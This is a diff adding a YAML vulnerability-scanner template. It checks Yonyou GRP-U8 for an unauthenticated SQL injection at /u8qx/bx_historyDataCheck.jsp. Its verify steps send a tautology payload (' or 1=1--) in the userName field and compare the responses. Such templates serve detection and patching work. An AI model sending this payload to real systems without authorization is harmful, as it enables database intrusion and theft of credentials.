@@ -1,0 +1,53 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+  name: 用友GRP-U8 bx_historyDataCheck SQL注入漏洞
+  level: 4
+  tags:
+    - sql_injection
+  description: 该漏洞是由于用友GRP-U8未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
+  homepage: https://www.yonyou.com/
+  author: Prism X
+  references: https://mp.weixin.qq.com/s?src=11&timestamp=1695650170&ver=4796&signature=PTkKv9wEFk1a24rRLYpteuS8z3ZhYwT1jiQPO1d5p2aWJSqx58-XpKeycQAFx04McEivqzD79rNKpU66-N-XKAKnKfdoak3*diWti9k3BhOqrjHzjekKC*cSKCWMmcjx&new=1
+  solution: 安装补丁
+  create_at: "2023-09-25 22:05:22"
+  available: false
+  steps:
+    variable:
+      - r1: randomLowercase(5)
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /u8qx/bx_historyDataCheck.jsp
+            redirect: true
+            header: [ ]
+            params: userName={{r1}}
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: "\r\n\r\n\r\n0\r\n\r\n"
+              type: equals
+        - request:
+            method: POST
+            path: /u8qx/bx_historyDataCheck.jsp
+            redirect: true
+            header:
+              - Content-Type: application/x-www-form-urlencoded
+            params: "userName=s ' or 1=1--"
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: "\r\n\r\n\r\n1\r\n\r\n"
+              type: equals
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
